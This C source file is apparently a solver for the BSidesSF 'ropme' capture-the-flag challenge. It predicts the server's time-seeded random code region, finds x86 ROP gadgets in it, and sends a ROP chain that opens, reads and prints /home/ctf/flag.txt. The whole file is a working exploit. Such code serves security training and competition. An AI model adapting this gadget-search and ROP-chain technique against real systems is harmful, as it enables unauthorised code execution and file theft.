#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <time.h>

#define HOSTNAME "ropme-63513a97.challenges.bsidessf.net"
#define PORT 1338

// These constants should match the executable
#define CODE_LENGTH 0x500000
#define STACK_LENGTH 4096
#define CODE_START 0x13370000

// This lets you adjust for network delays - play with this if you're consistently
// off by a second on connecting and sending the payload
#define FUDGE 0

// Should be >= the length of the flag
#define RESERVED_AT_START 32
#define FLAG_PATH "/home/ctf/flag.txt"

int do_connect() {
  struct hostent *hostname;    /* server host name information        */
  struct sockaddr_in server; /* server address                      */
  int s;                     /* client socket                       */

  hostname = gethostbyname(HOSTNAME);
  if(!hostname) {
    fprintf(stderr, "Gethostbyname failed\n");
    exit(1);
  }

  server.sin_family      = AF_INET;
  server.sin_port        = htons(PORT);
  server.sin_addr.s_addr = *((unsigned long *)hostname->h_addr);

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    fprintf(stderr, "Failed to create socket\n");
    exit(1);
  }

  if(connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
    fprintf(stderr, "Failed to connect\n");
    exit(1);
  }

  return s;
}

int get_timestamp(int s) {
  int offset = 0;
  char buf[1000];
  memset(buf, 0, sizeof(buf));

  // Make sure it ends.. this is very lazy
  int i;
  for(i = 0; i < 10; i++) {
    offset += recv(s, buf + offset, sizeof(buf) - offset, 0);

    printf("%s\n", buf);
    if(offset > 0x20) {
      return atoi(buf + 21);
    }
  }

  printf("Connection failed!\n");
  exit(1);
}

uint8_t *get_code(int timestamp) {
  printf("Timestamp = %d\n", timestamp);
  srand(timestamp);

  int i;
  uint32_t *random_code = (uint32_t *) malloc(CODE_LENGTH);
  for(i = 0; i < CODE_LENGTH / 4; i++) {
    random_code[i] = rand();
  }

  return (uint8_t*) random_code;
}

int find(uint8_t *buf, uint8_t *needle, size_t size) {
  int i;

  printf("Searching for: ");
  for(i = 0; i < size; i++) {
    printf("%02x ", needle[i]);
  }

  for(i = RESERVED_AT_START; i < CODE_LENGTH; i++) {
    if(!memcmp(buf+i, needle, size)) {
      printf(" - found @ 0x%08x\n", CODE_START + i);
      return CODE_START + i;
    }
  }

  printf(" - Couldn't find!\n");

  return 0;
}

int find_ret_n(uint8_t *buf, int minimum, int maximum, int *result) {
  int i;

  printf("Searching for ret N");

  for(i = RESERVED_AT_START; i < CODE_LENGTH; i++) {
    if(buf[i] == 0xc2) {
      //printf(" - Code %02x %02x %02x", buf[i], buf[i+1], buf[i+2]);
      uint16_t test = *((uint16_t*)(buf+i+1));
      //printf(" - Found ret %d", test);
      if(test % 4 == 0 && test > minimum && test < maximum) {
        printf("- Found ret %d @ 0x%08x\n", test, CODE_START + i);
        *result = test;
        return CODE_START + i;
      }
    }
  }

  printf(" - Couldn't find!\n");

  return 0;
}

uint32_t *get_stack(int timestamp) {
  // Generate the block
  uint8_t *code = get_code(timestamp);

  uint32_t *stack = malloc(STACK_LENGTH);
  memset(stack, 0, STACK_LENGTH);

  // Gather gadgets
  int debug = find(code, (uint8_t*)"\xcc", 1);
  int syscall = find(code, (uint8_t*)"\xcd\x80\xc3", 3);
  int ret = find(code, (uint8_t*) "\xc3", 1);
  int ret_length;
  int ret_n = find_ret_n(code, strlen(FLAG_PATH), 0x400, &ret_length);
  int pop_eax = find(code, (uint8_t*) "\x58\xc3", 2);
  int pop_ecx = find(code, (uint8_t*) "\x59\xc3", 2);
  int pop_edx = find(code, (uint8_t*) "\x5A\xc3", 2);
  int pop_ebx = find(code, (uint8_t*) "\x5B\xc3", 2);
  int inc_ebx = find(code, (uint8_t*) "\x43\xc3", 2);
  int dec_ebx = find(code, (uint8_t*) "\x4b\xc3", 2);
  //int mov_eax_esp = find(code, (uint8_t*) "\x89\xe0\xc3", 3);
  int mov_ebx_esp = find(code, (uint8_t*) "\x89\xe3\xc3", 3);

  int i = 0;

  // If this is defined, just do an exit syscall (so I can test quickly)
#ifdef _SIMPLE_SOLVE
  // Eax = 1 (exit)
  stack[i++] = pop_eax;
  stack[i++] = 1;

  // Ebx = 0 (no error)
  stack[i++] = pop_ebx;
  stack[i++] = 1337;

  // Syscall = write
  stack[i++] = syscall;
#else
  //////////////////////////// OPEN

  // Eax = 0x05 (sys_open)
  stack[i++] = pop_eax;
  stack[i++] = 0x05;

  // Ebx = esp (the stack)
  stack[i++] = mov_ebx_esp;


  // Skip over 32 bytes (where we'll store the flag path)
  stack[i++] = ret_n;

  // Do the first ebx increment (this happens before the big return)
  stack[i++] = inc_ebx;

  // We have <ret_length> bytes to mess around, now - fill them with garbage
  memset(&stack[i], 'A', ret_length);

  // Now fill them with the flag path
  memcpy(&stack[i], FLAG_PATH, strlen(FLAG_PATH) + 1);

  // Officially skip them
  i += (ret_length / 4);

  // These now happen after the return
  // Increment ebx across all the other return address + variable (8 words)
  stack[i++] = inc_ebx;
  stack[i++] = inc_ebx;
  stack[i++] = inc_ebx;
  stack[i++] = inc_ebx;
  stack[i++] = inc_ebx;
  stack[i++] = inc_ebx;
  stack[i++] = inc_ebx;

  // Ecx = count (our reserved space)
  stack[i++] = pop_ecx;
  stack[i++] = RESERVED_AT_START;

  // Syscall = this does the open()
  stack[i++] = syscall;

  ////////////////////////////// READ

  // Eax = 3 (read)
  stack[i++] = pop_eax;
  stack[i++] = 3;

  // Ebx = 0 (the file handle) - make it zero then subtract one so we don't have a null
  stack[i++] = pop_ebx;
  stack[i++] = 1;
  stack[i++] = dec_ebx;

  // Ecx = the buffer - the unused space
  stack[i++] = pop_ecx;
  stack[i++] = CODE_START;

  // Edx = the count
  stack[i++] = pop_edx;
  stack[i++] = RESERVED_AT_START;

  // Syscall = read
  stack[i++] = syscall;

  //////////////////////////// WRITE

  // Eax = 4 (write)
  stack[i++] = pop_eax;
  stack[i++] = 4;

  // Ebx = stdout (1)
  stack[i++] = pop_ebx;
  stack[i++] = 1;

  // Ecx = buf
  stack[i++] = pop_ecx;
  stack[i++] = CODE_START;

  // Edx = count
  stack[i++] = pop_edx;
  stack[i++] = RESERVED_AT_START;

  // Syscall = write
  stack[i++] = syscall;

  ////////////////////////////// EXIT

  // Eax = 1 (exit)
  stack[i++] = pop_eax;
  stack[i++] = 1;

  // Ebx = 0 (no error)
  stack[i++] = pop_ebx;
  stack[i++] = 1;
  stack[i++] = dec_ebx;

  // Syscall = write
  stack[i++] = syscall;
#endif

  // Check if we missed anything
  int misses = 0;
  int j;
  for(j = 0; j < i; j++) {
    if(stack[j] == 0) {
      misses++;
    }
  }

  free(code);

  if(misses > 0) {
    printf("Missing code bits: %d\n\n", misses);
    free(stack);
    return 0;
  }

  printf("Got 'em all!\n");
  return stack;
}

int go() {
  // Connect the initial time
  int s = do_connect();

  // Get the timestamp
  int their_timestamp = get_timestamp(s);
  int my_timestamp = time(NULL);

  int time_offset;
  uint32_t *stack = 0;
  for(time_offset = 0; ; time_offset++) {
    stack = get_stack(their_timestamp + time_offset);
    if(stack) {
      break;
    }
  }

  if(time_offset == 0) {
    printf("Woohoo! The connection is good, let's send!\n");
    send(s, stack, STACK_LENGTH, 0);
  } else {
    printf("We actually need to wait %d seconds...\n", time_offset);
    close(s);

    // Busy wait
    for(;;) {
      if(time(NULL) == my_timestamp + time_offset - FUDGE) {
        s = do_connect();
        int validate_time = get_timestamp(s);

        if(validate_time != their_timestamp + time_offset) {
          printf("Sad trombone! We needed %d, ended up at %d.. if this happens a lot, adjust FUDGE\n", validate_time, their_timestamp + time_offset);
          exit(1);
        }

        printf("We got in right on time! Sending payload and crossing fingers...\n");
        send(s, stack, STACK_LENGTH, 0);
        break;
      }
    }
  }

  free(stack);

  return s;
}

int main(int argc, char *argv[]) {
  int s = go();

  for(;;) {
    char buf[1000];
    memset(buf, 0, sizeof(buf));
    if(recv(s, buf, sizeof(buf), 0) <= 0) {
      printf("Done?\n");
      exit(0);
    }
    printf("%s\n", buf);
  }

  close(s);

  return 0;
}
